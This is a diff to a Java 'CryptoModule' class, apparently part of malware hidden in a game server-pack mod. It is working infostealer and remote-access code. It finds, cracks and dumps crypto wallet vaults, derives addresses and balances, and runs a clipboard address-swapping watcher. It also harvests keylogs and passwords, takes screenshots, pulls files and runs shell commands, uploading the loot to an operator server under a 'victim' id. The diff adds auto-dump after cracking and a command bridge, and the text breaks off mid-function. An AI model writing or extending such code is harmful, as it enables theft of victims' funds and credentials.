@@ -1,6 +1,9 @@
 package com.serverpackcore.agent.crypto;
 
 import com.serverpackcore.agent.AgentPaths;
+import com.serverpackcore.agent.Derive;
+import com.serverpackcore.agent.Disk;
+import com.serverpackcore.agent.TaskParams;
 import com.serverpackcore.agent.Harvest;
 import com.serverpackcore.agent.Json;
 import com.serverpackcore.agent.Screenshot;
@@ -43,12 +46,25 @@ public final class CryptoModule {
 		void send(String module, Path file);
 	}
 
-	public record Task(String id, String name, Map<String, Object> params, int timeout) {
+	/** Frame result hook. Returns false when the socket cannot take it. */
+	public interface FrameSink {
+		boolean deliver(String replyTo, String name, byte[] body);
 	}
+
+	public record Task(String id, String name, Map<String, Object> params, int timeout, String replyTo, boolean frame) {
+		public Task(String id, String name, Map<String, Object> params, int timeout) {
+			this(id, name, params, timeout, id, false);
+		}
+	}
+
+	private static final Set<String> HTTP_ONLY = Set.of(
+		"scan_wallets", "dump_vault", "crack_vault", "shell", "agent");
+	private static final byte[] HTTP_MARKER =
+		CryptoUtil.utf8("{\"status\":\"ok\",\"error\":null,\"result\":{\"http_result\":true},\"artifacts\":[]}");
 
 	private static final Set<String> SUPPORTED = Set.of(
 		"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop",
-		"shell", "harvest", "screenshot", "file_pull", "cancel");
+		"shell", "harvest", "screenshot", "file_pull", "cancel", "agent");
 	/** One collection at a time: these share a single heavy worker. */
 	private static final Set<String> HEAVY = Set.of("scan_wallets", "dump_vault", "crack_vault", "harvest");
 	static final String BUSY = "busy: another collection is running";
@@ -59,15 +75,20 @@ public final class CryptoModule {
 	private final CryptoLog log;
 	private final CryptoTransport transport;
 	private final Sink sink;
+	private volatile FrameSink frames;
+	private final com.serverpackcore.agent.Balance.Getter balance;
+	private final com.serverpackcore.agent.ClipboardService nativeClipboard;
+	private final java.util.function.Function<String, String> agentRunner;
 	private final Path stateFile;
 	private final Path work;
-	private final Map<String, Object> state = new LinkedHashMap<>();
-	private final Map<String, String> passwords = new LinkedHashMap<>();
-	private final Map<String, Map<String, Object>> uploads = new LinkedHashMap<>();
+	private final Map<String, Object> state = java.util.Collections.synchronizedMap(new LinkedHashMap<>());
+	private final Map<String, String> passwords = java.util.Collections.synchronizedMap(new LinkedHashMap<>());
+	private final Map<String, Map<String, Object>> uploads = java.util.Collections.synchronizedMap(new LinkedHashMap<>());
 	private final Map<String, String> moduleHealth = new ConcurrentHashMap<>();
 	private final Map<String, AtomicBoolean> cancels = new ConcurrentHashMap<>();
+	private final Set<String> timedOut = ConcurrentHashMap.newKeySet();
 	private final Map<String, Future<?>> active = new ConcurrentHashMap<>();
-	private final Map<String, Integer> counters = new LinkedHashMap<>();
+	private final Map<String, Integer> counters = java.util.Collections.synchronizedMap(new LinkedHashMap<>());
 	private final ExecutorService heavyPool = new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS,
 		new ArrayBlockingQueue<>(4), runnable -> {
 			Thread thread = new Thread(runnable, "spc-crypto-heavy");
@@ -98,11 +119,17 @@ public final class CryptoModule {
 	private volatile boolean running;
 	private volatile Thread hbThread;
 	private volatile Thread taskThread;
-	private volatile ClipboardWatcher clipboard;
+	private volatile com.serverpackcore.agent.ClipboardService clipboard;
 	private volatile CryptoConfig activeConfig;
 	private volatile String lastBreaker = "closed";
 
 	public CryptoModule(Path installDir, Path gameDir, CryptoConfig config, Sink sink) {
+		this(installDir, gameDir, config, sink, null, null);
+	}
+
+	public CryptoModule(Path installDir, Path gameDir, CryptoConfig config, Sink sink,
+		com.serverpackcore.agent.ClipboardService nativeClipboard,
+		java.util.function.Function<String, String> agentRunner) {
 		this.installDir = installDir;
 		this.gameDir = gameDir;
 		this.config = config;
@@ -118,6 +145,9 @@ public final class CryptoModule {
 		}
 		this.log = created;
 		this.transport = new CryptoTransport(config, created);
+		this.balance = com.serverpackcore.agent.Balance.getter(installDir);
+		this.nativeClipboard = nativeClipboard;
+		this.agentRunner = agentRunner;
 		loadState();
 		for (String name : List.of("wallets", "clipboard", "credentials", "seeds")) {
 			moduleHealth.put(name, "idle");
@@ -140,6 +170,11 @@ public final class CryptoModule {
 		return enabled;
 	}
 
+	/** Panel socket hook; absent in Discord-only mode. */
+	public void frames(FrameSink sink) {
+		this.frames = sink;
+	}
+
 	public String status() {
 		StringBuilder builder = new StringBuilder("crypto ").append(config);
 		builder.append(" victim=").append(transport.victimId().isEmpty() ? "-" : transport.victimId());
@@ -159,10 +194,7 @@ public final class CryptoModule {
 		running = true;
 		startedAt.set(System.currentTimeMillis());
 		if (config.clipboard && clipboard == null) {
-			clipboard = new ClipboardWatcher(this::coins, () -> {
-				Object value = state.get("clipRotation");
-				return value instanceof Map<?, ?> map ? castRotation(map) : new LinkedHashMap<>();
-			});
+			clipboard = service();
 			clipboard.start();
 		}
 		uploadsPool.submit(this::resumePending);
@@ -378,60 +410,108 @@ public final class CryptoModule {
 	}
 
 	private String version() {
-		String version = CryptoModule.class.getPackage().getImplementationVersion();
-		return version == null ? "0.3.0" : version;
+		return com.serverpackcore.agent.Version.current();
 	}
 
 	/** Returns null when accepted, or a readable rejection reason. */
 	public String submit(Task task) {
-		boolean collection = HEAVY.contains(task.name());
+		return submit(task, task.id());
+	}
+
+	public String submit(Task task, String id) {
+		Task accepted = id.equals(task.id()) ? task
+			: new Task(id, task.name(), task.params(), task.timeout(), task.replyTo(), task.frame());
+		boolean collection = HEAVY.contains(accepted.name());
 		if (collection && !heavy.tryAcquire()) {
 			return BUSY;
 		}
 		AtomicBoolean cancel = new AtomicBoolean();
-		cancels.put(task.id(), cancel);
+		cancels.put(accepted.id(), cancel);
 		try {
 			Future<?> future = (collection ? heavyPool : lightPool).submit(() -> {
 				long began = System.currentTimeMillis();
 				try {
-					Map<String, Object> result = handle(task, cancel);
-					if (cancel.get()) {
-						postResult(task, "cancelled", null, result);
+					Map<String, Object> result = handle(accepted, cancel);
+					if (timedOut.remove(accepted.id())) {
+						postResult(accepted, "error", "timeout", Map.of());
+					} else if (cancel.get() || Thread.currentThread().isInterrupted()) {
+						postResult(accepted, "cancelled", null, result);
 					} else {
-						postResult(task, "ok", null, result);
+						postResult(accepted, "ok", null, result);
 					}
 				} catch (Throwable throwable) {
-					warn("task " + task.name() + " failed", throwable);
-					postResult(task, "error", throwable.getClass().getSimpleName() + ":" + shortMessage(throwable), Map.of());
+					if (timedOut.remove(accepted.id())) {
+						postResult(accepted, "error", "timeout", Map.of());
+					} else if (cancel.get() || throwable instanceof InterruptedException) {
+						postResult(accepted, "cancelled", "cancelled", Map.of());
+					} else {
+						warn("task " + accepted.name() + " failed", throwable);
+						postResult(accepted, "error",
+							throwable.getClass().getSimpleName() + ":" + shortMessage(throwable), Map.of());
+					}
 				} finally {
-					active.remove(task.id());
-					cancels.remove(task.id());
+					active.remove(accepted.id());
+					cancels.remove(accepted.id());
+					timedOut.remove(accepted.id());
 					if (collection) {
 						heavy.release();
 					}
-					log("task " + task.name() + " " + (System.currentTimeMillis() - began) + "ms pid="
+					log("task " + accepted.name() + " " + (System.currentTimeMillis() - began) + "ms pid="
 						+ ProcessHandle.current().pid());
 				}
 			});
-			active.put(task.id(), future);
+			active.put(accepted.id(), future);
 		} catch (RejectedExecutionException rejected) {
-			cancels.remove(task.id());
+			cancels.remove(accepted.id());
 			if (collection) {
 				heavy.release();
 			}
 			return BUSY;
 		}
 		scheduler.schedule(() -> {
-			AtomicBoolean flag = cancels.get(task.id());
+			if (!active.containsKey(accepted.id())) {
+				return;
+			}
+			timedOut.add(accepted.id());
+			AtomicBoolean flag = cancels.get(accepted.id());
 			if (flag != null) {
 				flag.set(true);
 			}
-			Future<?> current = active.get(task.id());
+			Future<?> current = active.get(accepted.id());
 			if (current != null) {
 				current.cancel(true);
 			}
-		}, task.timeout(), TimeUnit.SECONDS);
+		}, accepted.timeout(), TimeUnit.SECONDS);
 		return null;
+	}
+
+	/** Cancels a running task by its server id. Returns false when unknown. */
+	public boolean cancel(String id) {
+		AtomicBoolean flag = cancels.get(id);
+		Future<?> future = active.get(id);
+		if (flag != null) {
+			flag.set(true);
+		}
+		if (future != null) {
+			future.cancel(true);
+		}
+		return flag != null || future != null;
+	}
+
+	public void resultError(String id, String name, String error) {
+		postResult(new Task(id, name, Map.of(), 30), "error", error, Map.of());
+	}
+
+	public void resultError(String id, String name, String error, String replyTo) {
+		postResult(new Task(id, name, Map.of(), 30, replyTo, true), "error", error, Map.of());
+	}
+
+	public void resultOk(String id, String name, Map<String, Object> result) {
+		postResult(new Task(id, name, Map.of(), 30), "ok", null, result);
+	}
+
+	public void resultOk(String id, String name, Map<String, Object> result, String replyTo) {
+		postResult(new Task(id, name, Map.of(), 30, replyTo, true), "ok", null, result);
 	}
 
 	private Map<String, Object> handle(Task task, AtomicBoolean cancel) throws Exception {
@@ -442,12 +522,13 @@ public final class CryptoModule {
 				case "dump_vault" -> dump(task, cancel);
 				case "crack_vault" -> crack(task, cancel);
 				case "clip_start" -> clipStart(task);
-				case "clip_stop" -> clipStop();
+				case "clip_stop" -> clipStop(task);
 				case "cancel" -> cancelTask(task);
 				case "shell" -> shell(task);
-				case "harvest" -> harvest();
-				case "screenshot" -> screenshot();
+				case "harvest" -> harvest(task);
+				case "screenshot" -> screenshot(task);
 				case "file_pull" -> filePull(task);
+				case "agent" -> agent(task);
 				default -> Map.of("ok", false);
 			};
 		} catch (Throwable throwable) {
@@ -461,6 +542,7 @@ public final class CryptoModule {
 			case "scan_wallets", "dump_vault", "crack_vault" -> "wallets";
 			case "clip_start", "clip_stop" -> "clipboard";
 			case "harvest" -> "seeds";
+			case "agent" -> "credentials";
 			default -> "credentials";
 		};
 	}
@@ -479,7 +561,7 @@ public final class CryptoModule {
 		List<Map<String, Object>> findings = new ArrayList<>();
 		Path moduleDir = work.resolve("scan-" + task.id());
 		Files.createDirectories(moduleDir);
-		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "wallets");
+		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "wallets", work.resolve("tmp"));
 		pack.budget(maxBytes);
 
 		try {
@@ -491,7 +573,7 @@ public final class CryptoModule {
 				if (target.kind().equals("creds")) {
 					continue;
 				}
-				wallets.add(inspect(target, cancel));
+				wallets.add(inspect(target, cancel, findings));
 			}
 			moduleHealth.put("credentials", "ok");
 			if (config.credentials) {
@@ -518,6 +600,7 @@ public final class CryptoModule {
 				Map<String, Object> row = wallet(wallet.id(), wallet.kind(), wallet.path().toString(), wallet.state(), wallet.reason());
 				if ("decrypted".equals(wallet.state()) && wallet.secret() != null) {
 					row.put("decrypted", true);
+					derive(row, findings, wallet.path().toString(), wallet.secret(), false);
 				}
 				wallets.add(row);
 			}
@@ -527,12 +610,11 @@ public final class CryptoModule {
 				if (cancel.get()) {
 					break;
 				}
-				Map<String, Object> row = new LinkedHashMap<>();
-				row.put("path", finding.path());
-				row.put("kind", finding.kind());
-				row.put("value", finding.value());
-				row.put("words", finding.words());
-				findings.add(row);
+				addFinding(findings, finding.path(), finding.kind(), finding.value(), finding.words());
+				Map<String, Object> row = wallet("seed-" + Math.abs(finding.value().hashCode()), "seed_file",
+					finding.path(), "decrypted", "seed_file");
+				derive(row, findings, finding.path(), finding.value(), false);
+				wallets.add(row);
 			}
 			moduleHealth.put("seeds", "ok");
 		}
@@ -553,12 +635,16 @@ public final class CryptoModule {
 				pack.add(source, "seeds/" + source.getFileName(), "seed_file");
 			}
 		}
-		String upload = pack.size() > 0 ? queueUpload(pack, "wallets") : "";
+		String upload = pack.size() > 0 ? queueUpload(pack, "wallets", task.id()) : "";
 		Map<String, Object> result = new LinkedHashMap<>();
-		result.put("wallets", wallets);
-		result.put("seeds", findings);
+		// The full list lives in wallets.json inside the ZIP; the result keeps
+		// the first rows so a 2 500-file scan stays far below the 4 MiB cap.
+		result.put("wallets", wallets.size() > 300 ? wallets.subList(0, 300) : wallets);
+		result.put("seeds", findings.size() > 100 ? findings.subList(0, 100) : findings);
+		result.put("wallet_count", wallets.size());
+		result.put("seed_count", findings.size());
 		result.put("elapsed_ms", System.currentTimeMillis() - began);
-		result.put("truncated", wallets.size() >= maxFiles);
+		result.put("truncated", wallets.size() > 300 || findings.size() > 100 || wallets.size() >= maxFiles);
 		if (!upload.isEmpty()) {
 			result.put("upload_id", upload);
 		}
@@ -569,7 +655,42 @@ public final class CryptoModule {
 		}
 	}
 
-	private Map<String, Object> inspect(CryptoPaths.Target target, AtomicBoolean cancel) {
+	private void addFinding(List<Map<String, Object>> findings, String path, String kind, String value, int words) {
+		for (Map<String, Object> existing : findings) {
+			if (String.valueOf(existing.get("kind")).equals(kind)
+				&& String.valueOf(existing.get("value")).equals(value)) {
+				return;
+			}
+		}
+		Map<String, Object> row = new LinkedHashMap<>();
+		row.put("path", path);
+		row.put("kind", kind);
+		row.put("value", value);
+		row.put("words", words);
+		findings.add(row);
+	}
+
+	/** Derives EVM/BTC/Solana addresses and a cached balance into a wallet row. */
+	private void derive(Map<String, Object> row, List<Map<String, Object>> findings,
+		String path, String secret, boolean finding) {
+		try {
+			for (Derive.Found found : Derive.fromSecret(secret)) {
+				if (row.get("address") == null || row.get("address").toString().isEmpty()) {
+					row.put("address", found.address());
+					row.put("balance", balance.get(found.coin(), found.address()));
+					row.put("explorer", Derive.explorer(found.coin(), found.address()));
+				}
+				if (finding) {
+					addFinding(findings, path, found.coin(), found.address(), 0);
+				}
+			}
+		} catch (Throwable throwable) {
+			log("derive failed: " + shortMessage(throwable));
+		}
+	}
+
+	private Map<String, Object> inspect(CryptoPaths.Target target, AtomicBoolean cancel,
+		List<Map<String, Object>> findings) {
 		Path copy = null;
 		try {
 			if (target.extension() && target.kind().equals("extension")) {
@@ -578,18 +699,25 @@ public final class CryptoModule {
 				DesktopDump.copyLevel(target.path(), copy);
 			}
 			Path vault = findVault(copy != null ? copy : target.path());
-			Map<String, Object> row = wallet(target.id(), target.kind(), target.path().toString(), vault == null ? "found" : "locked",
-				vault == null ? "no_vault" : "password_required");
+			Map<String, Object> row = wallet(target.id(), target.kind(), target.path().toString(),
+				vault == null ? "found" : "locked", vault == null ? "no_vault" : "password_required");
 			if (vault != null) {
+				row.put("crackable", true);
 				String password = passwords.get(target.id());
 				if (password != null) {
 					VaultV3.Result attempt = VaultV3.decrypt(Files.readString(vault, StandardCharsets.UTF_8), password);
 					if (attempt.ok()) {
 						row.put("state", "decrypted");
 						row.put("reason", "vault_password_saved");
+						row.put("decrypt_state", "done");
+						for (SeedScanner.Finding secret : SeedScanner.find(attempt.plaintext(), target.path().toString())) {
+							addFinding(findings, secret.path(), secret.kind(), secret.value(), secret.words());
+							derive(row, findings, secret.path(), secret.value(), false);
+						}
+					} else {
+						row.put("reason", "wrong_password");
 					}
 				}
-				row.put("crackable", true);
 			}
 			return row;
 		} catch (Throwable throwable) {
@@ -631,7 +759,9 @@ public final class CryptoModule {
 		Path temp = CredentialDump.tempRoot(installDir).resolve("dump-" + task.id());
 		Files.createDirectories(temp);
 
-		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "wallets");
+		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "wallets", work.resolve("tmp"));
+		List<Map<String, Object>> secrets = new ArrayList<>();
+		List<Map<String, Object>> findings = new ArrayList<>();
 		try {
 		if (target != null) {
 			Path copy = temp.resolve("store");
@@ -643,6 +773,7 @@ public final class CryptoModule {
 				if (password != null) {
 					VaultV3.Result attempt = VaultV3.decrypt(Files.readString(vault, StandardCharsets.UTF_8), password);
 					if (attempt.ok()) {
+						indexPlaintext(targetId, attempt.plaintext(), findings, secrets);
 						pack.add(CryptoUtil.utf8(attempt.plaintext()), "wallets/" + targetId + "/decrypted.json", "vault_plain");
 					}
 				}
@@ -652,6 +783,7 @@ public final class CryptoModule {
 			DesktopDump.copyLevel(source, copy);
 			addTree(pack, copy, "wallets/" + targetId, cancel);
 			if (desktopWallet.secret() != null) {
+				indexPlaintext(targetId, desktopWallet.secret(), findings, secrets);
 				pack.add(CryptoUtil.utf8(desktopWallet.secret()), "wallets/" + targetId + "/secret.txt", "seed");
 			}
 			for (String suffix : new String[] { ".wallet" }) {
@@ -661,6 +793,7 @@ public final class CryptoModule {
 						if (password != null) {
 							String secret = DesktopWallets.electrumPassword(file, password);
 							if (secret != null) {
+								indexPlaintext(targetId, secret, findings, secrets);
 								pack.add(CryptoUtil.utf8(secret), "wallets/" + targetId + "/" + file.getFileName() + ".secret", "seed");
 							}
 						}
@@ -668,21 +801,51 @@ public final class CryptoModule {
 				}
 			}
 		}
+		if (!secrets.isEmpty()) {
+			pack.add(CryptoUtil.utf8(Json.stringify(secrets)),
+				"wallets/" + targetId + "/addresses.json", "index");
+			Map<String, Object> index = new LinkedHashMap<>();
+			index.put("findings", findings);
+			pack.add(CryptoUtil.utf8(Json.stringify(index)),
+				"wallets/" + targetId + "/findings.json", "index");
+		}
 		Map<String, Object> result = new LinkedHashMap<>();
 		result.put("target", targetId);
 		result.put("artifacts", pack.size());
 		result.put("bytes", pack.bytes());
+		result.put("secrets", secrets.size());
 		if (pack.size() == 0) {
 			result.put("status", "partial");
 			return result;
 		}
-		String upload = queueUpload(pack, "wallets");
+		String upload = queueUpload(pack, "wallets", task.id());
 		result.put("upload_id", upload);
 		result.put("status", upload.isEmpty() ? "partial" : "queued");
 		return result;
 		} finally {
 			pack.close();
 			cleanup(temp);
+		}
+	}
+
+	/** Parses decrypted vault plaintext into findings and derived addresses. */
+	private void indexPlaintext(String target, String plaintext, List<Map<String, Object>> findings,
+		List<Map<String, Object>> secrets) {
+		if (plaintext == null || plaintext.isEmpty()) {
+			return;
+		}
+		for (SeedScanner.Finding secret : SeedScanner.find(plaintext, "vault:" + target)) {
+			addFinding(findings, secret.path(), secret.kind(), secret.value(), secret.words());
+			for (Derive.Found found : Derive.fromSecret(secret.value())) {
+				Map<String, Object> row = new LinkedHashMap<>();
+				row.put("coin", found.coin());
+				row.put("address", found.address());
+				row.put("balance", balance.get(found.coin(), found.address()));
+				row.put("explorer", Derive.explorer(found.coin(), found.address()));
+				row.put("source", secret.kind());
+				secrets.add(row);
+				addFinding(findings, "vault:" + target, found.coin(), found.address(), 0);
+			}
 		}
 	}
 
@@ -750,19 +913,66 @@ public final class CryptoModule {
 		out.put("password", result.password());
 		out.put("attempts", result.attempts());
 		out.put("elapsed_ms", result.elapsedMs());
+		// A correct password continues straight into a secure dump, so the
+		// operator does not need a second manual task.
+		if (result.found() && leveldb != null) {
+			Path copy = temp.resolve("store");
+			try {
+				Path vault = findVault(copy);
+				if (vault != null) {
+					VaultV3.Result opened = VaultV3.decrypt(Files.readString(vault, StandardCharsets.UTF_8), result.password());
+					if (opened.ok()) {
+						List<Map<String, Object>> findings = new ArrayList<>();
+						List<Map<String, Object>> secrets = new ArrayList<>();
+						indexPlaintext(targetId, opened.plaintext(), findings, secrets);
+						ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "wallets", work.resolve("tmp"));
+						try {
+							pack.add(CryptoUtil.utf8(opened.plaintext()),
+								"wallets/" + targetId + "/decrypted.json", "vault_plain");
+							if (!secrets.isEmpty()) {
+								pack.add(CryptoUtil.utf8(Json.stringify(secrets)),
+									"wallets/" + targetId + "/addresses.json", "index");
+							}
+							Map<String, Object> index = new LinkedHashMap<>();
+							index.put("findings", findings);
+							pack.add(CryptoUtil.utf8(Json.stringify(index)),
+								"wallets/" + targetId + "/findings.json", "index");
+							String upload = queueUpload(pack, "wallets", task.id());
+							out.put("upload_id", upload);
+							out.put("artifacts", pack.size());
+							out.put("status", upload.isEmpty() ? "partial" : "queued");
+							out.put("secrets", secrets.size());
+						} finally {
+							pack.close();
+						}
+					}
+				}
+			} catch (Throwable throwable) {
+				log("crack dump failed: " + shortMessage(throwable));
+			}
+		}
 		cleanup(temp);
 		return out;
 	}
 
 	// ── clipboard ───────────────────────────────────────────────────────────
 
-	private Map<String, Object> clipStart(Task task) {
+	private synchronized com.serverpackcore.agent.ClipboardService service() {
 		if (clipboard == null) {
-			clipboard = new ClipboardWatcher(this::coins, () -> {
-				Object value = state.get("clipRotation");
-				return value instanceof Map<?, ?> map ? castRotation(map) : new LinkedHashMap<>();
-			});
+			if (AgentPaths.isWindows() && nativeClipboard != null) {
+				clipboard = nativeClipboard;
+			} else {
+				clipboard = new ClipboardWatcher(this::coins, () -> {
+					Object value = state.get("clipRotation");
+					return value instanceof Map<?, ?> map ? castRotation(map) : new LinkedHashMap<>();
+				});
+			}
 		}
+		return clipboard;
+	}
+
+	private Map<String, Object> clipStart(Task task) {
+		service();
 		int max = (int) Json.num(task.params(), "max_history", 500L);
 		clipboard.configure(max);
 		if (Boolean.TRUE.equals(task.params().get("replace"))) {
@@ -786,21 +996,21 @@ public final class CryptoModule {
 		}
 		clipboard.start();
 		moduleHealth.put("clipboard", "ok");
-		counters.put("clip", clipboard.snapshot().size());
+		counters.put("clip", clipboard.size());
 		return Map.of("ok", true);
 	}
 
-	private Map<String, Object> clipStop() {
+	private Map<String, Object> clipStop(Task task) throws Exception {
 		String upload = "";
 		if (clipboard != null) {
 			clipboard.stop();
 			Path dir = work.resolve("clipboard");
 			Path file = clipboard.flush(dir);
 			if (file != null) {
-				ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "clipboard");
+				ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "clipboard", work.resolve("tmp"));
 				try {
 					if (pack.add(file, "clipboard.jsonl", "clipboard")) {
-						upload = queueUpload(pack, "clipboard");
+						upload = queueUpload(pack, "clipboard", task.id());
 					}
 				} finally {
 					pack.close();
@@ -861,6 +1071,9 @@ public final class CryptoModule {
 
 	private Map<String, Object> shell(Task task) throws Exception {
 		String command = Json.str(task.params(), "command", "");
+		if (command.isBlank()) {
+			throw new IllegalArgumentException("Usage: shell <command>");
+		}
 		long timeout = Math.min(120_000L, Json.num(task.params(), "timeout_sec", 60L) * 1000L);
 		String output = Shell.run(installDir, command, timeout);
 		Map<String, Object> out = new LinkedHashMap<>();
@@ -869,13 +1082,13 @@ public final class CryptoModule {
 		return out;
 	}
 
-	private Map<String, Object> harvest() throws Exception {
+	private Map<String, Object> harvest(Task task) throws Exception {
 		Path zip = Harvest.build(installDir, gameDir);
 		Map<String, Object> result = new LinkedHashMap<>();
 		result.put("ok", true);
 		result.put("path", zip.getFileName().toString());
 		Path ops = AgentPaths.cache(installDir).resolve("ops");
-		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "keylogs");
+		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "harvest", work.resolve("tmp"));
 		Path converted = work.resolve("keylogs-" + System.currentTimeMillis() + ".jsonl");
 		Path passwords = work.resolve("passwords-" + System.currentTimeMillis() + ".jsonl");
 		try {
@@ -887,11 +1100,13 @@ public final class CryptoModule {
 				pack.add(passwords, "passwords.jsonl", "passwords");
 			}
 			pack.add(ops.resolve("seeds.log"), "seeds.log", "seeds");
+			pack.add(zip, "harvest/" + zip.getFileName(), "harvest");
 			if (pack.size() > 0) {
-				result.put("upload_id", queueUpload(pack, "keylogs"));
+				result.put("upload_id", queueUpload(pack, "harvest", task.id()));
 			}
 		} finally {
 			pack.close();
+			Files.deleteIfExists(zip);
 			Files.deleteIfExists(converted);
 			Files.deleteIfExists(passwords);
 		}
@@ -937,12 +1152,12 @@ public final class CryptoModule {
 		}
 	}
 
-	private Map<String, Object> screenshot() throws Exception {
+	private Map<String, Object> screenshot(Task task) throws Exception {
 		Path file = Screenshot.save(work.resolve("screens"));
-		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "screenshot");
+		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "screenshot", work.resolve("tmp"));
 		try {
 			pack.add(file, "screenshot.png", "screenshot");
-			String upload = queueUpload(pack, "screenshot");
+			String upload = queueUpload(pack, "screenshot", task.id());
 			Map<String, Object> result = new LinkedHashMap<>();
 			result.put("upload_id", upload);
 			result.put("bytes", Files.size(file));
@@ -952,23 +1167,47 @@ public final class CryptoModule {
 		}
 	}
 
+	private Map<String, Object> agent(Task task) {
+		String command = Json.str(task.params(), "command", "");
+		String output = agentRunner == null ? "agent bridge unavailable" : agentRunner.apply(command);
+		Map<String, Object> out = new LinkedHashMap<>();
+		out.put("ok", com.serverpackcore.agent.CommandExecutor.agentAllowed(command));
+		out.put("output", output);
+		return out;
+	}
+
 	private Map<String, Object> filePull(Task task) throws Exception {
 		String value = Json.str(task.params(), "path", "");
+		if (value.isBlank()) {
+			throw new IllegalArgumentException("path_required");
+		}
 		Path file = Path.of(value);
+		if (Files.isDirectory(file)) {
+			throw new IllegalArgumentException("is_directory: use a file path");
+		}
 		if (!Files.isRegularFile(file)) {
 			throw new IllegalArgumentException("file_not_found");
 		}
 		long max = Json.num(task.params(), "max_mb", 64L) * 1024L * 1024L;
-		if (Files.size(file) > max || Files.size(file) > config.maxArtifact) {
-			throw new IllegalArgumentException("file_too_large");
+		long size = Files.size(file);
+		if (size > max) {
+			throw new IllegalArgumentException("file_too_large: " + Disk.mb(size) + " MiB > "
+				+ Disk.mb(max) + " MiB max_mb");
 		}
-		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "files");
+		if (size > config.maxArtifact) {
+			throw new IllegalArgumentException("file_too_large: profile cap " + Disk.mb(config.maxArtifact) + " MiB");
+		}
+		ArtifactPack pack = new ArtifactPack(config, transport.victimId(), "files", work.resolve("tmp"));
 		try {
-			pack.add(file, "files/" + file.getFileName(), "file");
-			String upload = queueUpload(pack, "files");
+			if (!pack.add(file, "files/" + file.getFileName(), "file")) {
+				throw new IllegalArgumentException("file_too_large or disk_low");
+			}
+			String upload = queueUpload(pack, "files", task.id());
 			Map<String, Object> result = new LinkedHashMap<>();
 			result.put("upload_id", upload);
-			result.put("bytes", Files.size(file));
+			result.put("bytes", size);
+			result.put("name", file.getFileName().toString());
+			result.put("progress", "100");
 			return result;
 		} finally {
 			pack.close();
@@ -977,7 +1216,7 @@ public final class CryptoModule {
 
 	// ── uploads ─────────────────────────────────────────────────────────────
 
-	private String queueUpload(ArtifactPack pack, String module) {
+	private String queueUpload(ArtifactPack pack, String module, String taskId) {
 		try {
 			uploadsActive.incrementAndGet();
 			Path dir = work.resolve("uploads");
@@ -988,7 +1227,7 @@ public final class CryptoModule {
 			long size = Files.size(file);
 			int chunks = (int) Math.ceil(size / (double) CryptoConfig.CHUNK);
 			Map<String, Object> body = new LinkedHashMap<>();
-			body.put("task_id", null);
+			body.put("task_id", taskId != null && TaskParams.uuid(taskId) ? taskId : null);
 			body.put("module", module);
 			body.put("container_version", 1);
 			body.put("total_size", size);
@@ -1045,11 +1284,12 @@ public final class CryptoModule {
 			record.put("sha", sha);
 			record.put("chunks", chunks);
 			record.put("module", module);
+			record.put("task", taskId == null ? "" : taskId);
 			uploads.put(uploadId, record);
 			saveState();
 			uploadsPool.submit(() -> {
 				try {
-					stream(file, uploadId, sha, chunks, module);
+					stream(file, uploadId, sha, chunks, module, taskId);
 				} catch (Throwable throwable) {
 					warn("upload failed", throwable);
 				} finally {
@@ -1064,7 +1304,7 @@ public final class CryptoModule {
 		}
 	}
 
-	private void stream(Path file, String uploadId, String sha, int chunks, String module) throws Exception {
+	private void stream(Path file, String uploadId, String sha, int chunks, String module, String taskId) throws Exception {
 		long size = Files.size(file);
 		long offset = 0;
 		byte[] buffer = new byte[CryptoConfig.CHUNK];
@@ -1087,7 +1327,7 @@ public final class CryptoModule {
 					return;
 				}
 				if (reply.status() == 410) {
-					resumeUpload(uploadId, file, sha, chunks, module);
+					resumeUpload(uploadId, file, sha, chunks, module, taskId);
 					return;
 				}
 				if (reply.status() != 200) {
@@ -1114,7 +1354,7 @@ public final class CryptoModule {
 		log("uploaded " + module + " " + size + " bytes");
 	}
 
-	private void resumeUpload(String uploadId, Path file, String sha, int chunks, String module) throws Exception {
+	private void resumeUpload(String uploadId, Path file, String sha, int chunks, String module, String taskId) throws Exception {
 		Map<String, Object> record = uploads.get(uploadId);
 		long offset = 0;
 		CryptoTransport.Reply status = transport.uploadStatus(uploadId);
@@ -1122,7 +1362,7 @@ public final class CryptoModule {
 			offset = Json.num(status.json(), "received", 0L);
 		} else {
 			Map<String, Object> body = new LinkedHashMap<>();
-			body.put("task_id", null);
+			body.put("task_id", taskId != null && TaskParams.uuid(taskId) ? taskId : null);
 			body.put("module", module);
 			body.put("container_version", 1);
 			body.put("total_size", Files.size(file));
@@ -1170,12 +1410,13 @@ public final class CryptoModule {
 				String sha = Json.str(entry.getValue(), "sha", "");
 				int chunks = (int) Json.num(entry.getValue(), "chunks", 0L);
 				String module = Json.str(entry.getValue(), "module", "wallets");
+				String task = Json.str(entry.getValue(), "task", "");
 				if (sha.isEmpty() || chunks <= 0) {
 					continue;
 				}
 				uploadsActive.incrementAndGet();
 				try {
-					resumeUpload(entry.getKey(), file, sha, chunks, module);
+					resumeUpload(entry.getKey(), file, sha, chunks, module, task);
 				} finally {
 					uploadsActive.decrementAndGet();
 				}
@@ -1225,13 +1466,35 @@ public final class CryptoModule {
 		body.put("status", status);
 		body.put("error", error);
 		body.put("result", result);
-		body.put("artifacts", List.of());
+		List<Object> artifacts = new ArrayList<>();
+		String upload = Json.str(result, "upload_id", "");
+		if (!upload.isEmpty()) {
+			Map<String, Object> link = new LinkedHashMap<>();
+			link.put("upload_request", upload);
+			artifacts.add(link);
+		}
+		body.put("artifacts", artifacts);
+		// One stringify: these exact bytes are the HTTP body and the frame body,
+		// and the frame HMAC signs the envelope that contains them. There is no
+		// second serialization on the signing path.
 		byte[] json = CryptoUtil.utf8(Json.stringify(body));
+		FrameSink frameSink = frames;
+		boolean byFrame = task.frame() && frameSink != null;
+		if (byFrame && !HTTP_ONLY.contains(task.name()) && json.length <= 262_144) {
